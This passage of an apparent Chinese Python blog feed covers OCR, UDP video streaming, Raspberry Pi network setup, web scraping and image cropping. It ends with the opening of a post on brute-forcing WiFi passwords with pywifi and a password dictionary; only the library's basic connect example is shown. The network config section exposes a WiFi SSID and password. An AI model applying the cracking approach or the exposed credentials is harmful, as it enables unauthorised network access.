# You can set the parameter &#96;lang&#96; as &#96;ch&#96;, &#96;en&#96;, &#96;french&#96;, &#96;german&#96;, &#96;korean&#96;, &#96;japan&#96;
# to switch the language model in order.
#ocr &#x3D; PaddleOCR(use_angle_cls&#x3D;True, lang&#x3D;&#39;ch&#39;)  # need to run only once to download and load model into memory
ocr &#x3D; PaddleOCR(lang&#x3D;&#39;ch&#39;,use_gpu&#x3D;False)
img_path &#x3D; &#39;NVIDIA1.png&#39;
result &#x3D; ocr.ocr(img_path)
print(result)
for line in result:
    print(line)
image &#x3D; Image.open(img_path).convert(&#39;RGB&#39;)
boxes &#x3D; [line[0] for line in result]
txts &#x3D; [line[1][0] for line in result]
scores &#x3D; [line[1][1] for line in result]
im_show &#x3D; draw_ocr(image, boxes, txts, scores)
im_show &#x3D; Image.fromarray(im_show)
im_show.save(&#39;result.jpg&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 最后一个参数是可信度。可见可信度、准确度更高。识别时延为100ms-1000ms，对于实时性的系统，建议慎用。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>OCR</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>实时视频传输_切割压缩、丢包统计</title>
    <url>/2021/04/28/python-%E5%AE%9E%E6%97%B6%E8%A7%86%E9%A2%91%E4%BC%A0%E8%BE%93-%E5%88%87%E5%89%B2%E5%8E%8B%E7%BC%A9%E3%80%81%E4%B8%A2%E5%8C%85%E7%BB%9F%E8%AE%A1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="实时视频传输-切割压缩、丢包统计"><a href="#实时视频传输-切割压缩、丢包统计" class="headerlink" title="实时视频传输_切割压缩、丢包统计"></a>实时视频传输_切割压缩、丢包统计</h1><h2 id="UDP实时视频传输"><a href="#UDP实时视频传输" class="headerlink" title="UDP实时视频传输"></a>UDP实时视频传输</h2><h3 id="udp连接"><a href="#udp连接" class="headerlink" title="udp连接"></a>udp连接</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>在选择UDP作为传输协议时必须要谨慎。在网络质量令人十分不满意的环境下，UDP协议数据包丢失会比较严重。但是由于UDP的特性：它不属于连接型协议，因而具有资源消耗小，处理速度快的优点，所以通常音频、视频和普通数据在传送时使用UDP较多，因为它们即使偶尔丢失一两个数据包，也不会对接收结果产生太大影响。比如我们聊天用的ICQ和QQ就是使用的UDP协议。  </p>
<p>在现场测控领域，面向的是分布化的控制器、监测器等，其应用场合环境比较恶劣，这样就对待传输数据提出了不同的要求，如实时、抗干扰性、安全性等。基于此，现场通信中，若某一应用要将一组数据传送给网络中的另一个节点，可由UDP进程将数据加上报头后传送给IP进程，UDP协议省去了建立连接和拆除连接的过程，取消了重发检验机制，能够达到较高的通信速率。</p>
<p>1.发送端<br><pre class="line-numbers language-none"><code class="language-none">import threading
import socket
sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
t &#x3D; threading.Thread(target&#x3D;mythread, args&#x3D;(sock, string, (&#39;192.168.201.106&#39;, 9999)))
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>2.接收端<br><pre class="line-numbers language-none"><code class="language-none">import socket
import time
import threading
s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind((&#39;192.168.201.106&#39;, 9999))
data, addr &#x3D; s.recvfrom(60000)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="图像处理"><a href="#图像处理" class="headerlink" title="图像处理"></a>图像处理</h3><h4 id="旋转变换"><a href="#旋转变换" class="headerlink" title="旋转变换"></a>旋转变换</h4><pre class="line-numbers language-none"><code class="language-none">img &#x3D; img.transpose(Image.ROTATE_180)
img &#x3D; img.transpose(Image.FLIP_LEFT_RIGHT)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这分别为图像旋转和左右翻转变换，我们拍到的视频是镜像翻转对称的，因此要进行以下处理，才能看到正像。</p>
<h3 id="图像转Bytes"><a href="#图像转Bytes" class="headerlink" title="图像转Bytes"></a>图像转Bytes</h3><p>这个我找到了好几种方法：cv2转Image转bytes、cv2转np转bytes、</p>
<h4 id="cv2转np转Image转bytes"><a href="#cv2转np转Image转bytes" class="headerlink" title="cv2转np转Image转bytes"></a>cv2转np转Image转bytes</h4><pre class="line-numbers language-none"><code class="language-none">image &#x3D; Image.fromarray(cv.cvtColor(frame, cv.COLOR_BGR2RGB))
string &#x3D; Image.fromarray(np.uint8(image)).tobytes()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="cv2转np转bytes"><a href="#cv2转np转bytes" class="headerlink" title="cv2转np转bytes"></a>cv2转np转bytes</h4><pre class="line-numbers language-none"><code class="language-none">image &#x3D; Image.fromarray(cv.cvtColor(frame, cv.COLOR_BGR2RGB))
string&#x3D;np.uint8(image).tostring()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="pygame转bytes"><a href="#pygame转bytes" class="headerlink" title="pygame转bytes"></a>pygame转bytes</h4><pre class="line-numbers language-none"><code class="language-none">Img &#x3D; pygame.image.load(&#39;&#x2F;home&#x2F;pi&#x2F;实验&#x2F;视频传输数据采集&#x2F;test.jpg&#39;)
string &#x3D; pygame.image.tostring(Img, &quot;RGB&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="Bytes转图片"><a href="#Bytes转图片" class="headerlink" title="Bytes转图片"></a>Bytes转图片</h3><h4 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h4><pre class="line-numbers language-none"><code class="language-none">img &#x3D; Image.frombuffer(&quot;RGB&quot;, (160, 120), data)#, &#39;raw&#39;, &quot;L&quot;, 0, 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="pygame"><a href="#pygame" class="headerlink" title="pygame"></a>pygame</h3><pre class="line-numbers language-none"><code class="language-none">img &#x3D; pygame.image.frombuffer(data, (160, 120), &quot;RGB&quot;)
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><ol>
<li>发送端</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none"># coding:utf-8
import cv2 as cv
import time
import threading
import socket
import numpy as np
from PIL import Image
def mythread(sock, data, addr):
    sock.sendto(data, addr)
    print(&quot;已发送 &quot; + str(len(data)) + &quot; bytes&quot;)
    sock.close()
def main():
    print(&quot;begin&quot;)
    start &#x3D; time.clock()
    capture &#x3D; cv.VideoCapture(0)
    while True:
        ret, frame &#x3D; capture.read()
        frame &#x3D; cv.flip(frame, -1)
        frame &#x3D; cv.resize(frame, (160, 120))
        image &#x3D; Image.fromarray(cv.cvtColor(frame, cv.COLOR_BGR2RGB))
        string &#x3D; Image.fromarray(np.uint8(image)).tobytes()
        sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        t &#x3D; threading.Thread(target&#x3D;mythread, args&#x3D;(sock, string, (&#39;192.168.201.106&#39;, 9999)))
        t.start()
        if cv.waitKey(10) &amp; 0xff &#x3D;&#x3D; ord(&#39;q&#39;):
            capture.release()
            break
main()
cv.destroyAllWindows()
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>接收端<pre class="line-numbers language-none"><code class="language-none">#coding&#x3D;utf-8
import socket
import time
import threading
import numpy as np
import cv2
from PIL import Image
s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind((&#39;192.168.201.106&#39;, 9999))
print(&#39;Waiting for connection...&#39;)
start &#x3D; time.perf_counter()
while not False:
    data, addr &#x3D; s.recvfrom(60000)
    if time.perf_counter() - start &gt; 1:
        start &#x3D; time.perf_counter()
    print(&#39;Received from %s:%s.&#39; % addr)
    img &#x3D; Image.frombuffer(&quot;RGB&quot;, (160, 120), data)#, &#39;raw&#39;, &quot;L&quot;, 0, 1
    img &#x3D; img.transpose(Image.ROTATE_180)
    img &#x3D; img.transpose(Image.FLIP_LEFT_RIGHT)
    crop_im &#x3D; cv2.cvtColor(np.array(img), cv2.COLOR_RGBA2BGRA)
    cv2.imshow(&#39;UDP 视频传输&#39;,crop_im)
    if cv2.waitKey(1) &#x3D;&#x3D; 27:  # 按下“ESC”退出
        break
    print(&#39;have received one frame&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="udp视频传输结果："><a href="#udp视频传输结果：" class="headerlink" title="udp视频传输结果："></a>udp视频传输结果：</h3></li>
</ol>
<p><img src="E:\blog\blog_2020\source\download\img\实时视频传输\接收端.jpg" alt=""></p>
<p><img src="E:\blog\blog_2020\source\download\img\实时视频传输\实时捕获.jpg" alt=""></p>
<h2 id="图片的切割与拼接"><a href="#图片的切割与拼接" class="headerlink" title="图片的切割与拼接"></a>图片的切割与拼接</h2><h2 id="各种类型转bytes传输"><a href="#各种类型转bytes传输" class="headerlink" title="各种类型转bytes传输"></a>各种类型转bytes传输</h2><h2 id="对图片进行jpg压缩与还原"><a href="#对图片进行jpg压缩与还原" class="headerlink" title="对图片进行jpg压缩与还原"></a>对图片进行jpg压缩与还原</h2><h2 id="jpg压缩后的切割与传输"><a href="#jpg压缩后的切割与传输" class="headerlink" title="jpg压缩后的切割与传输"></a>jpg压缩后的切割与传输</h2><p>传输时延、丢包率</p>
<pre class="line-numbers language-none"><code class="language-none">auto lo
iface lo inet loopback

iface eth0 inet manual


auto wlan0
iface wlan0 inet static 
address 192.168.201.165
netmask 255.255.255.0
gateway 192.168.201.1
pre-up wpa_supplicant -Dwext -i wlan0 -c&#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant2.conf -B

allow-hotplug wlan0
iface wlan0 inet manual
    wpa-conf &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant2.conf

auto wlan1
iface wlan1 inet static 
address 192.168.201.165
netmask 255.255.255.0
gateway 192.168.201.1
pre-up wpa_supplicant -Dwext -i wlan1 -c&#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf -B

allow-hotplug wlan1
iface wlan1 inet manual
    wpa-conf &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>sudo create_ap -n wlan0 car_wifi xmu20111 -c 1</p>
<p>ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev<br>update_config=1<br>country=CN</p>
<p>network={<br>        ssid=”xmu201_1”<br>        psk=”xmu20111”<br>        key_mgmt=WPA-PSK<br>}</p>
<p> sudo nano /media/pi/rootfs/etc/network/interfaces<br> sudo nano /etc/network/interfaces<br> cd /media/pi/rootfs/etc/wpa_supplicant/</p>
<p>sudo nano /media/pi/rootfs/etc/dhcpcd.conf<br>sudo nano /etc/dhcpcd.conf</p>
<p>dhcp 域名解析</p>
<pre class="line-numbers language-none"><code class="language-none">sudo nano &#x2F;etc&#x2F;dhcpcd.conf
# A sample configuration for dhcpcd.
# See dhcpcd.conf(5) for details.

# Allow users of this group to interact with dhcpcd via the control socket.
#controlgroup wheel

# Inform the DHCP server of our hostname for DDNS.
hostname

# Use the hardware address of the interface for the Client ID.
clientid
# or
# Use the same DUID + IAID as set in DHCPv6 for DHCPv4 ClientID as per RFC4361.
#duid

# Persist interface configuration when dhcpcd exits.
persistent

# Rapid commit support.
# Safe to enable by default because it requires the equivalent option set
# on the server to actually work.
option rapid_commit

# A list of options to request from the DHCP server.
option domain_name_servers, domain_name, domain_search, host_name
option classless_static_routes
# Most distributions have NTP support.
option ntp_servers
# Respect the network MTU.
# Some interface drivers reset when changing the MTU so disabled by default.
#option interface_mtu

# A ServerID is required by RFC2131.
require dhcp_server_identifier

# Generate Stable Private IPv6 Addresses instead of hardware based ones
slaac private

# A hook script is provided to lookup the hostname if not set by the DHCP
# server, but it should not be run by default.
nohook lookup-hostname

interface eth0
static ip_address&#x3D;192.168.3.233&#x2F;24
static routers&#x3D;192.168.3.1
static domain_name_servers&#x3D;114.114.114.114

interface wlan0
#static ip_address&#x3D;172.16.233.233&#x2F;16
#static routers&#x3D;172.16.0.1
static domain_name_servers&#x3D;114.114.114.114

static ip_address&#x3D;10.42.0.233&#x2F;24
static routers&#x3D;10.42.0.1



<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python抓取网页数据</title>
    <url>/2021/10/26/python%E6%8A%93%E5%8F%96%E7%BD%91%E9%A1%B5%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="python抓取网页数据"><a href="#python抓取网页数据" class="headerlink" title="python抓取网页数据"></a>python抓取网页数据</h1><blockquote>
<p>解析效率：正则表达式&gt;lxml&gt;beautifulsoup</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th>爬取方式</th>
<th>正则表达式</th>
<th>lxml</th>
<th>beautifulsoup</th>
</tr>
</thead>
<tbody>
<tr>
<td>解析效率</td>
<td>高</td>
<td>中</td>
<td>低</td>
</tr>
<tr>
<td>复杂度</td>
<td>低</td>
<td>中</td>
<td>高</td>
</tr>
<tr>
<td>代码</td>
<td><code>urllib2.urlopen(urllist).read()</code></td>
<td><code>BeautifulSoup(html,&#39;html.parser&#39;)</code></td>
<td><code>lxml.html.fromstring(html)</code></td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<p>lxml库功能和使用类似BeautifulSoup库，不过lxml解析速度比beautifulsoup快。</p>
</blockquote>
<h2 id="爬取网页基础"><a href="#爬取网页基础" class="headerlink" title="爬取网页基础"></a>爬取网页基础</h2><h3 id="requests-html下载"><a href="#requests-html下载" class="headerlink" title="requests_html下载"></a>requests_html下载</h3><ol>
<li>安装anaconda</li>
<li><code>pip install pipenv</code></li>
<li>运行完后运行： <code>pipenv install</code></li>
<li><code>pip install requests_html</code><h3 id="爬取网站"><a href="#爬取网站" class="headerlink" title="爬取网站"></a>爬取网站</h3><pre class="line-numbers language-none"><code class="language-none">from requests_html import HTMLSession
session &#x3D; HTMLSession()
url &#x3D; &#39;https:&#x2F;&#x2F;www.codekp.cn&#x2F;&#39;
r &#x3D; session.get(url)
print(r.html.text)
print(r.html.links)
print(r.html.absolute_links)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<ul>
<li><code>r.html.text</code>为网页文本内容</li>
<li><code>r.html.links</code>网页中包含的全部链接</li>
<li><code>r.html.absolute_links</code>为网页中包含的绝对路径<blockquote>
<p>输出结果为网站链接，和我们想要的内容并不完全相符，因此为了达到获取关键信息的目的，我们还需要进一步研究。跟Python说清楚我们要找的东西。这是网页抓取的关键。</p>
</blockquote>
</li>
</ul>
<h3 id="数据可视化pandas"><a href="#数据可视化pandas" class="headerlink" title="数据可视化pandas"></a>数据可视化pandas</h3><p>只需要这一行命令，我们就能把刚才的列表变成数据框：<br>df = pd.DataFrame(get_text_link_from_sel(sel))</p>
<p>表头设置<code>df.columns = [&#39;text&#39;, &#39;link&#39;]</code></p>
<p>保存csv格式<code>df.to_csv(&#39;output.csv&#39;, encoding=&#39;gbk&#39;, index=False)</code></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-none"><code class="language-none">from requests_html import HTMLSession
session &#x3D; HTMLSession()
url &#x3D; &#39;https:&#x2F;&#x2F;www.codekp.cn&#39;
r &#x3D; session.get(url)
def get_text_link_from_sel(sel):
    mylist &#x3D; []
    try:
        results &#x3D; r.html.find(sel)
        for result in results:
            mytext &#x3D; result.text
            mylink &#x3D; list(result.absolute_links)[0]
            mylist.append((mytext, mylink))
        return mylist
    except:
        return None
# print(r.html.text)
# print(r.html.links)
# print(r.html.absolute_links)
sel &#x3D; &#39;head &gt; link:nth-child(22)&#39;
results &#x3D; r.html.find(sel)
print(results)
# sel &#x3D; &#39;body &gt; div.note &gt; div.post &gt; div.article &gt; div.show-content &gt; div &gt; p &gt; a&#39;
print(get_text_link_from_sel(sel))

import pandas as pd
df &#x3D; pd.DataFrame(get_text_link_from_sel(sel))
df.to_csv(&#39;output.csv&#39;, encoding&#x3D;&#39;gbk&#39;, index&#x3D;False)
print(df)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="urllib-使用"><a href="#urllib-使用" class="headerlink" title="urllib 使用"></a>urllib 使用</h2><pre class="line-numbers language-none"><code class="language-none">urllib.request.urlopen() 模拟浏览器向服务器发送请求
response 服务器返回的数据
response的数据类型是HttpResponse
字节‐‐&gt;字符串
解码decode
字符串‐‐&gt;字节
编码encode
read() 字节形式读取二进制 扩展：rede(5)返回前几个字节
readline() 读取一行
readlines() 一行一行读取 直至结束
getcode() 获取状态码
geturl() 获取url
getheaders() 获取headers
urllib.request.urlretrieve()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="通过urllib下载"><a href="#通过urllib下载" class="headerlink" title="通过urllib下载"></a>通过urllib下载</h3><pre class="line-numbers language-none"><code class="language-none">import urllib.request
# 下载网页
# url_page &#x3D; &#39;http:&#x2F;&#x2F;www.baidu.com&#39;
# url代表的是下载的路径  filename文件的名字
# 在python中 可以变量的名字  也可以直接写值
# urllib.request.urlretrieve(url_page,&#39;baidu.html&#39;)
# 下载图片
# url_img &#x3D; &#39;https:&#x2F;&#x2F;img1.baidu.com&#x2F;it&#x2F;u&#x3D;3004965690,4089234593&amp;fm&#x3D;26&amp;fmt&#x3D;auto&amp;gp&#x3D;0.jpg&#39;
# urllib.request.urlretrieve(url&#x3D; url_img,filename&#x3D;&#39;lisa.jpg&#39;)
# 下载视频
url_video &#x3D; &#39;https:&#x2F;&#x2F;vd3.bdstatic.com&#x2F;mda-mhkku4ndaka5etk3&#x2F;1080p&#x2F;cae_h264&#x2F;1629557146541497769&#x2F;mda-mhkku4ndaka5etk3.mp4?v_from_s&#x3D;hkapp-haokan-tucheng&amp;auth_key&#x3D;1629687514-0-0-7ed57ed7d1168bb1f06d18a4ea214300&amp;bcevod_channel&#x3D;searchbox_feed&amp;pd&#x3D;1&amp;pt&#x3D;3&amp;abtest&#x3D;&#39;
urllib.request.urlretrieve(url_video,&#39;hxekyyds.mp4&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="BeautifulSoup爬取辛巴克菜单"><a href="#BeautifulSoup爬取辛巴克菜单" class="headerlink" title="BeautifulSoup爬取辛巴克菜单"></a>BeautifulSoup爬取辛巴克菜单</h2><pre class="line-numbers language-none"><code class="language-none">import urllib.request
from bs4 import BeautifulSoup
url &#x3D; &#39;https:&#x2F;&#x2F;www.starbucks.com.cn&#x2F;menu&#x2F;&#39;
response &#x3D; urllib.request.urlopen(url)
content &#x3D; response.read().decode(&#39;utf-8&#39;)
soup &#x3D; BeautifulSoup(content,&#39;lxml&#39;)
# &#x2F;&#x2F;ul[@class&#x3D;&quot;grid padded-3 product&quot;]&#x2F;&#x2F;strong&#x2F;text()
name_list &#x3D; soup.select(&#39;ul[class&#x3D;&quot;grid padded-3 product&quot;] strong&#39;)
for name in name_list:
    print(name.get_text())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="lxml获取百度一下"><a href="#lxml获取百度一下" class="headerlink" title="lxml获取百度一下"></a>lxml获取百度一下</h2><pre class="line-numbers language-none"><code class="language-none">import urllib.request
url &#x3D; &#39;https:&#x2F;&#x2F;www.baidu.com&#x2F;&#39;
headers &#x3D; &#123;
    &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;92.0.4515.159 Safari&#x2F;537.36&#39;
&#125;
# 请求对象的定制
request &#x3D; urllib.request.Request(url &#x3D; url,headers &#x3D; headers)
# 模拟浏览器访问服务器
response &#x3D; urllib.request.urlopen(request)
# 获取网页源码
content &#x3D; response.read().decode(&#39;utf-8&#39;)
# 解析网页源码 来获取我们想要的数据
from lxml import etree
# 解析服务器响应的文件
tree &#x3D; etree.HTML(content)
# 获取想要的数据  xpath的返回值是一个列表类型的数据
result &#x3D; tree.xpath(&#39;&#x2F;&#x2F;input[@id&#x3D;&quot;su&quot;]&#x2F;@value&#39;)[0]
print(result)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>python放大按图片中心剪切、缩小</title>
    <url>/2021/03/31/python%E6%94%BE%E5%A4%A7%E6%8C%89%E5%9B%BE%E7%89%87%E4%B8%AD%E5%BF%83%E5%89%AA%E5%88%87%E3%80%81%E7%BC%A9%E5%B0%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="python放大并按图片中心剪切、放大"><a href="#python放大并按图片中心剪切、放大" class="headerlink" title="python放大并按图片中心剪切、放大"></a>python放大并按图片中心剪切、放大</h1><div class="table-container">
<table>
<thead>
<tr>
<th>缩小</th>
<th>原始大小</th>
<th>放大并剪切后</th>
</tr>
</thead>
<tbody>
<tr>
<td><img src="https://img-blog.csdnimg.cn/20210331104832232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></td>
<td><img src="https://img-blog.csdnimg.cn/20210331103805575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></td>
<td><img src="https://img-blog.csdnimg.cn/20210331103730206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></td>
</tr>
</tbody>
</table>
</div>
<h3 id="放大"><a href="#放大" class="headerlink" title="放大"></a>放大</h3><pre class="line-numbers language-none"><code class="language-none">img&#x3D;crop_image(cv2.resize(img, None, fx&#x3D;1, fy&#x3D;1, interpolation&#x3D;cv2.INTER_CUBIC),new_height,new_width)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="缩小"><a href="#缩小" class="headerlink" title="缩小"></a>缩小</h3><pre class="line-numbers language-none"><code class="language-none">mini&#x3D; cv2.resize(cv2.copyMakeBorder(img, P_A, P_A, P_A, P_A, cv2.BORDER_REPLICATE), (150, 150))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>其中有将矩阵转Image、Image转矩阵两个过程。</p>
<pre class="line-numbers language-none"><code class="language-none">def crop_image(re_img,new_height,new_width):
    re_img&#x3D;Image.fromarray(np.uint8(re_img))
    width, height &#x3D; re_img.size
    left &#x3D; (width - new_width)&#x2F;2
    top &#x3D; (height - new_height)&#x2F;2
    right &#x3D; (width + new_width)&#x2F;2
    bottom &#x3D; (height + new_height)&#x2F;2
    crop_im &#x3D; re_img.crop((left, top, right, bottom)) #Cropping Image
    crop_im &#x3D; np.asarray(crop_im)
    return crop_im

new_width &#x3D; 150     #Enter the crop image width
new_height &#x3D; 150    #Enter the crop image height

img &#x3D; cv2.imread(&quot;learn&#x2F;cats&#x2F;cat.3.jpg&quot;)
img&#x3D;cv2.resize(img,(150,150))
P_A&#x3D;50
img&#x3D;crop_image(cv2.resize(img, None, fx&#x3D;1, fy&#x3D;1, interpolation&#x3D;cv2.INTER_CUBIC),new_height,new_width)

plt.imshow(img)
plt.title(&#39;cat&#39;)
plt.show()
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>pywifi_局域网WiFi暴力破解</title>
    <url>/2021/05/26/pywifi-%E5%B1%80%E5%9F%9F%E7%BD%91WiFi%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="pywifi-局域网WiFi暴力破解"><a href="#pywifi-局域网WiFi暴力破解" class="headerlink" title="pywifi_局域网WiFi暴力破解"></a>pywifi_局域网WiFi暴力破解</h1><p>最近又看到python的一个组件，pywifi，然后了解了一下就发现可以用程序连接wifi，然后我去csdn用了50积分下载了一个wifi常用字典。就可以暴力破解wifi密码，前提是密码库里面有你需要的密码。</p>
<h2 id="pywifi"><a href="#pywifi" class="headerlink" title="pywifi"></a>pywifi</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre class="line-numbers language-none"><code class="language-none">pip install pywifi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h3><pre class="line-numbers language-none"><code class="language-none">import pywifi

wifi &#x3D; pywifi.PyWiFi()

iface &#x3D; wifi.interfaces()[0]

iface.disconnect()
time.sleep(1)
assert iface.status() in\
    [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

profile &#x3D; pywifi.Profile()
profile.ssid &#x3D; &#39;testap&#39;
profile.auth &#x3D; const.AUTH_ALG_OPEN
profile.akm.append(const.AKM_TYPE_WPA2PSK)
profile.cipher &#x3D; const.CIPHER_TYPE_CCMP
profile.key &#x3D; &#39;12345678&#39;

iface.remove_all_network_profiles()
tmp_profile &#x3D; iface.add_network_profile(profile)

iface.connect(tmp_profile)
time.sleep(30)
assert iface.status() &#x3D;&#x3D; const.IFACE_CONNECTED

iface.disconnect()
time.sleep(1)
assert iface.status() in\
    [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>参考自：<a href="https://pypi.org/project/pywifi/">https://pypi.org/project/pywifi/</a></p>
